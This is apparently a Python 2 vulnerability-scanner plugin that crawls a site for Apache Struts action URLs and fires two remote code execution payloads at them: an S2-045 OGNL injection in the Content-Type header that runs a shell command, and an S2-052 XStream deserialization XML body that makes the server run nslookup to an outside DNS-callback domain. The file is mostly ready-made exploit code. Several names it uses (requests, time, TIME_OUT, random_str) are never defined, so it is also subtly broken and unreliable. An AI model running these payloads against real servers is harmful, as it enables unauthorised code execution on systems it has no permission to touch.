# coding:utf-8
import urllib2
import httplib
import logging
import re
import urlparse
import HTMLParser
import random

from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def plugin_info():
    return {
        "name": "st2-045",
        "info": "S2_045远程代码执行",
        "Author":"Jaqen",
        "Create_date":"2017-10-01",
    }
def get_url(domain, timeout):
    url_list = []
    try:
        res = urllib2.urlopen(domain, timeout=timeout)
        html = res.read()
    except Exception, e:
        return
    root_url = res.geturl()
    m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))

def exploit(ip):
    result = []
    if Domain:
        for domain in Domain:
            url_list = get_url(domain, TIME_OUT)
            if url_list:
                for url in url_list:
                    if re.search("\.action|\.do|\.ma", url):
                        data ="test"
                        payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo available').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
                        headers = {'content-type': payload,'User-Agent':random.choice(USER_AGENT_LIST)}
                        try:
                            httplib.HTTPConnection._http_vsn = 10
                            httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
                            request = urllib2.Request(url,data,headers)
                            response = urllib2.urlopen(request,timeout=TIME_OUT)
                            if 'available' in response.read():
                                result.append(url+" >>>> 存在S2_045代码执行漏洞")
                                break
                            else:
                                pass
                        except Exception, e:
                            logging.error(e)
                        test_str = random_str(6)+".1.rs11.ga"
                        post_data = """<map>
                    <entry>
                    <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command><string>nslookup</string><string>%s</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                    </entry>
                    </map>""" % test_str
                    try:
                        resp = requests.post(url, data=post_data, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST),"Content-Type":"application/xml"}, allow_redirects=True, verify=False)
                    except Exception, e:
                        logging.error(e)
                        continue
                    if resp.status_code == 500:
                        time.sleep(1)
                        try:
                            resp = requests.get("http://"+test_str, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                        except Exception,e:
                            logging.error('dnslogapi error')
                            continue
                        if "True" in resp.text:
                            result.append(url+" >>>> S2-052 远程代码执行漏洞")
                            break
                    else:
                        pass
        if len(result):
            return result
